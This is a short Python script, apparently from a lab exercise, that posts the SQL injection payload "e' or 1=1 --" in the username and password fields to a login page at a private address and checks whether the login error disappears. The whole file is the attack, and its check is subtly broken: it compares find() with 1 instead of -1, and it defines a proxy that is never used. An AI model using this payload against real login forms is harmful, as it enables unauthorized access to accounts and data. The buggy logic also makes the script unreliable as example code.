import requests
import sys

proxies = {'http' : 'http://127.0.0.1:8181', 'https':'https://127.0.0.1:8080'}

data = {"username":"e' or 1=1 --", "password":"e' or 1=1 --"}
res = requests.post("https://192.168.56.120/login.php", data = data)

if res.content.find(b"login error") !=1:
    print ("found it!")
    sys.exit()
else :
    print ("not found")